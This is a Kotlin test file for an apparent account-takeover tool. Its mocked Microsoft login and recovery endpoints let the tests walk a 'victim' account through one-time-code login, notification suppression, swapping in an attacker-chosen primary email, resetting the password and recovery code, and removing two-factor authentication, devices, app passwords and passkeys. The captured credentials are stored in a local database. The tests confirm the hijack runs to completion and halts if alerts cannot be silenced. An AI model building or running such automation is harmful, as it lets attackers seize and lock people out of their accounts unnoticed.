package microsoft.recovery

import database.DatabaseManager
import database.repository.SqliteAccountRepository
import io.ktor.client.engine.mock.MockEngine
import io.ktor.client.engine.mock.respond
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.http.headersOf
import kotlinx.coroutines.runBlocking
import microsoft.recovery.model.RecoveryResult
import microsoft.recovery.model.RecoveryStage
import java.io.File
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertIs
import kotlin.test.assertNotNull
import kotlin.test.assertTrue

class RecoveryServiceTest {

    private fun createMockEngine(
        ifExistsResult: Int = 0,
        failAtNotification: Boolean = false,
        otcState: Int = 201,
        returnAuthCookie: Boolean = true,
        includeTokenT: Boolean = true,
    ): MockEngine {
        var manageAdditionalCalls = 0

        return MockEngine { request ->
            val path = request.url.encodedPath
            when {
                path == "/login.srf" && request.url.parameters.contains("wreply") -> {
                    if (!includeTokenT) {
                        respond("<html><body>No token here</body></html>", HttpStatusCode.OK)
                    } else {
                        respond(
                            content = """
                                <html>
                                <form>
                                <input type="hidden" name="t" value="SAMPLE_TOKEN_T_VALUE_1024"/>
                                </form>
                                </html>
                            """.trimIndent(),
                            status = HttpStatusCode.OK,
                            headers = headersOf(HttpHeaders.ContentType, "text/html"),
                        )
                    }
                }

                path == "/login.srf" -> {
                    respond(
                        content = """
                            <html>
                            <script>
                            var ServerData = {"sFTAg":"<input type=\"hidden\" name=\"PPFT\" id=\"i0327\" value=\"MOCK_PPFT_123\"/>","canary":""};
                            </script>
                            </html>
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "text/html"),
                    )
                }

                path == "/GetCredentialType.srf" -> {
                    val proofsJson = if (ifExistsResult == 0) {
                        """[{"data":"proof_data_xyz","display":"user@example.com","type":1}]"""
                    } else {
                        "[]"
                    }
                    respond(
                        content = """
                            {
                                "IfExistsResult": $ifExistsResult,
                                "Credentials": {
                                    "HasPassword": 1,
                                    "OtcLoginEligibleProofs": $proofsJson
                                }
                            }
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/GetOneTimeCode.srf" -> {
                    respond(
                        content = """
                            {
                                "State": $otcState,
                                "FlowToken": "MOCK_NEW_PPFT_456"
                            }
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/ppsecure/post.srf" -> {
                    val headers = if (returnAuthCookie) {
                        headersOf(
                            HttpHeaders.ContentType to listOf("text/html"),
                            HttpHeaders.SetCookie to listOf("__Host-MSAAUTH=msa_session_cookie_token; path=/; secure"),
                        )
                    } else {
                        headersOf(HttpHeaders.ContentType, "text/html")
                    }
                    respond(
                        content = "<html>Redirecting...</html>",
                        status = HttpStatusCode.Found,
                        headers = headers,
                    )
                }

                path == "/proofs/Add" -> {
                    respond(
                        content = "<html>Redirecting...</html>",
                        status = HttpStatusCode.Found,
                        headers = headersOf(
                            HttpHeaders.ContentType to listOf("text/html"),
                            HttpHeaders.SetCookie to listOf(
                                "AMRPSSecAuth=amrp_sec_cookie_val; path=/; domain=account.live.com",
                                "amsc=amsc_cookie_val; path=/; domain=account.live.com",
                            ),
                        ),
                    )
                }

                path == "/proofs/manage/additional" -> {
                    manageAdditionalCalls++
                    respond(
                        content = """
                            <html>
                            <script>
                            var t0 = {
                                "WLXAccount": {
                                    "manageProofs": {
                                        "encryptedNetId": "enc_net_id_\\u002b123\\u003d",
                                        "apiCanary": "canary_token_manage_1",
                                        "emailProofs": [{"name": "victim_email\\u0040example.com"}],
                                        "smsProofs": [{"name": "+1234567890"}],
                                        "passKeys": [{"passKeyId": "passkey-id-1"}]
                                    }
                                }
                            };
                            </script>
                            </html>
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "text/html"),
                    )
                }

                path == "/API/Proofs/GenerateRecoveryCode" -> {
                    respond(
                        content = """
                            {
                                "recoveryCode": "INITIAL-RECOV-11111-22222-33333",
                                "apiCanary": "canary_token_after_gen"
                            }
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/ResetPassword.aspx" -> {
                    respond(
                        content = """
                            <html>
                            <script>
                            var ServerData = {
                                "sRecoveryToken": "s_recovery_token_\\u002bdata_xyz",
                                "apiCanary": "canary_token_reset_page"
                            };
                            </script>
                            </html>
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "text/html"),
                    )
                }

                path == "/API/Recovery/VerifyRecoveryCode" -> {
                    respond(
                        content = """
                            {
                                "token": "verification_grant_token_123",
                                "apiCanary": "canary_token_after_verify"
                            }
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/API/Recovery/RecoverUser" -> {
                    respond(
                        content = """
                            {
                                "recoveryCode": "FINAL-RECOV-44444-55555-66666",
                                "apiCanary": "canary_token_after_recover"
                            }
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/API/Proofs/SetUserNotificationState" -> {
                    if (failAtNotification) {
                        respond("Internal server error", HttpStatusCode.InternalServerError)
                    } else {
                        respond(
                            content = """{"apiCanary": "canary_token_after_notify"}""",
                            status = HttpStatusCode.OK,
                            headers = headersOf(HttpHeaders.ContentType, "application/json"),
                        )
                    }
                }

                path == "/AddAssocId" -> {
                    respond("<html>Alias added</html>", HttpStatusCode.OK)
                }

                path == "/API/MakePrimary" -> {
                    respond(
                        content = """{"apiCanary": "canary_token_after_makeprimary"}""",
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/names/manage" -> {
                    respond("<html>Alias removed</html>", HttpStatusCode.OK)
                }

                path == "/API/Proofs/DisableTfa" ||
                path == "/API/Proofs/DeleteDevices" ||
                path == "/API/Proofs/DeleteAppPassword" ||
                path == "/API/Proofs/RemovePasskey" -> {
                    respond(
                        content = """{"apiCanary": "canary_token_after_cleanup"}""",
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                else -> error("Unhandled request path: $path")
            }
        }
    }

    @Test
    fun testCompleteLifecycleSuccess(): Unit = runBlocking {
        val engine = createMockEngine()
        val tempDb = File.createTempFile("test_recov_", ".db")
        val dbManager = DatabaseManager(tempDb.absolutePath)
        val repository = SqliteAccountRepository(dbManager)

        val service = RecoveryService(
            clientEngine = engine,
            stageDelayMs = 0L,
            accountRepository = repository,
        )

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newEmail = "administrator2026@outlook.com",
        )

        assertIs<RecoveryResult.Success>(result)
        assertEquals("victim@example.com", result.originalEmail)
        assertEquals("administrator2026@outlook.com", result.newPrimaryEmail)
        assertEquals("INITIAL-RECOV-11111-22222-33333", result.initialRecoveryCode)
        assertEquals("FINAL-RECOV-44444-55555-66666", result.finalRecoveryCode)
        assertEquals(2, result.suppressedProofsCount)
        assertTrue(result.password.isNotEmpty())
        assertTrue(result.password.length in 12..16)

        val saved = repository.getAccountByEmail("victim@example.com")
        assertNotNull(saved)
        assertEquals(result.password, saved.password)
        assertEquals("FINAL-RECOV-44444-55555-66666", saved.recoveryCode)
        assertEquals("administrator2026@outlook.com", saved.currentPrimaryEmail)

        dbManager.close()
        tempDb.delete()
    }

    @Test
    fun testAccountNotFoundInDiscovery() = runBlocking {
        val engine = createMockEngine(ifExistsResult = 1)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "nonexistent@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.CREDENTIAL_DISCOVERY, result.stage)
        assertEquals("1", result.errorCode)
    }

    @Test
    fun testAccountThrottledInDiscovery() = runBlocking {
        val engine = createMockEngine(ifExistsResult = 5)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "throttled@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.CREDENTIAL_DISCOVERY, result.stage)
        assertEquals("5", result.errorCode)
    }

    @Test
    fun testMissingAuthCookieFailsSessionEstablishment() = runBlocking {
        val engine = createMockEngine(returnAuthCookie = false)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.SESSION_ESTABLISHMENT, result.stage)
    }

    @Test
    fun testNotificationSuppressionFailClosed() = runBlocking {
        val engine = createMockEngine(failAtNotification = true)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.NOTIFICATION_SUPPRESSION, result.stage)
    }
}
